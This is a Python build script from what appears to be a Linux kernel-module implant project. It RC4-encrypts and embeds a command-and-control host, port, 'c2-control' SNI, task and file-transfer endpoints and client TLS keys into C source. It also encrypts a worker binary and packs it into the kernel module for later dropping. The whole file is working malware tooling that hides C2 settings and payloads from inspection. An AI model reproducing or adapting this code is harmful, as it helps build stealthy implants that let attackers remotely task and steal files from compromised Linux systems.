#!/usr/bin/env python3
import argparse
import pathlib

ROOT = pathlib.Path(__file__).parents[1]
SEAL_KEY = b"ksnftc-lab-instance"  # keep in sync with src/worker/src/obfuscate.c
BLOB_KEY = b"315380d551b108dbbd4ad9e29afc726f"
SEALED_STRING = "host"
STRINGS = ("host", "port", "sni", "tasks", "result", "files")
BLOBS = ("ca", "cert", "key")
MAX_STRING = 64
MAX_BLOB = 8192


def rc4(key, data):
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) & 255
        state[i], state[j] = state[j], state[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) & 255
        j = (j + state[i]) & 255
        state[i], state[j] = state[j], state[i]
        out.append(byte ^ state[(state[i] + state[j]) & 255])
    return bytes(out)


def seal(key, data, row):
    if len(data) > row:
        raise SystemExit(f"sealed record exceeds row size {row}: {len(data)}")
    sealed = rc4(key, data)
    return sealed + b"\0" * (row - len(sealed)), len(data)


def hex_bytes(data, indent="\t"):
    return [indent + ",".join(f"0x{b:02x}" for b in data) + ","]


def write_material(args, out):
    values = [args.host, args.port, "c2-control", "/v1/tasks", "/result", "/v1/files"]
    strings = [
        (
            seal(SEAL_KEY, value.encode(), MAX_STRING)
            if name == SEALED_STRING
            else (value.encode(), len(value))
        )
        for name, value in zip(STRINGS, values)
    ]
    material = pathlib.Path(args.material_dir)
    sources = {"ca": "ca.crt", "cert": "client.crt", "key": "client.key"}
    blobs = [(material / sources[name]).read_bytes() for name in BLOBS]
    blobs = [(b + b"\0" * (MAX_BLOB - len(b)), len(b)) for b in blobs]
    lines = [
        "/* generated by scripts/embed_worker.py - do not edit */",
        "#include <linux/types.h>",
        "",
        f"unsigned char seal_strings[{len(STRINGS)}][{MAX_STRING}] = {{",
    ]
    for name, (sealed, _) in zip(STRINGS, strings):
        if name != SEALED_STRING:
            continue
        lines.append("\t{" + ",".join(f"0x{b:02x}" for b in sealed) + "},")
    lines.append("};")
    lines.append(f"const unsigned int seal_string_lens[{len(STRINGS)}] = {{")
    lens = [
        (n if name == SEALED_STRING else 0) for name, (_, n) in zip(STRINGS, strings)
    ]
    lines.append("\t" + ",".join(str(n) for n in lens) + "};")
    lines.append(f"unsigned char plain_strings[{len(STRINGS)}][{MAX_STRING}] = {{")
    for name, (value, _) in zip(STRINGS, strings):
        if name == SEALED_STRING:
            continue
        lines.append("\t{" + ",".join(f"0x{b:02x}" for b in value) + "},")
    lines.append("};")
    lines.append(f"const unsigned int plain_string_lens[{len(STRINGS)}] = {{")
    lens = [
        (n if name != SEALED_STRING else 0) for name, (_, n) in zip(STRINGS, strings)
    ]
    lines.append("\t" + ",".join(str(n) for n in lens) + "};")
    lines.append(f"unsigned char plain_blobs[{len(BLOBS)}][{MAX_BLOB}] = {{")
    for sealed, _ in blobs:
        lines.append("\t{")
        for offset in range(0, MAX_BLOB, 16):
            lines.extend(hex_bytes(sealed[offset : offset + 16]))
        lines.append("\t},")
    lines.append("};")
    lines.append(f"const unsigned int plain_blob_lens[{len(BLOBS)}] = {{")
    lines.append("\t" + ",".join(str(n) for _, n in blobs) + "};")
    out.write_text("\n".join(lines) + "\n")
    print(f"material sealed -> {out.relative_to(ROOT)}")


def write_blob(args, out):
    image = pathlib.Path(args.worker).read_bytes()
    sealed, length = seal(BLOB_KEY, image, len(image))
    lines = [
        "/* generated by scripts/embed_worker.py - do not edit */",
        "#include <linux/types.h>",
        "",
        "const unsigned char em_ksnftc_worker_key[] = {",
        ",".join(f"0x{b:02x}" for b in BLOB_KEY) + "};",
        f"const unsigned int em_ksnftc_worker_key_len = {len(BLOB_KEY)};",
        f"const unsigned int em_ksnftc_worker_len = {length};",
        f"const unsigned char em_ksnftc_worker[{length}] = {{",
    ]
    for offset in range(0, length, 16):
        lines.extend(hex_bytes(sealed[offset : offset + 16], indent=""))
    lines.append("};")
    out.write_text("\n".join(lines) + "\n")
    print(f"worker image embedded ({length} bytes) -> {out.relative_to(ROOT)}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", default="9443")
    parser.add_argument("--material-dir", default="build/c2-material")
    parser.add_argument("--worker", default="src/worker/ks-worker")
    parser.add_argument("--skip-material", action="store_true")
    parser.add_argument("--skip-blob", action="store_true")
    args = parser.parse_args()
    if not args.skip_material:
        write_material(args, ROOT / "src/worker/src/obfuscate_data.c")
    if not args.skip_blob:
        write_blob(args, ROOT / "src/lkm/src/worker_blob.c")


if __name__ == "__main__":
    main()
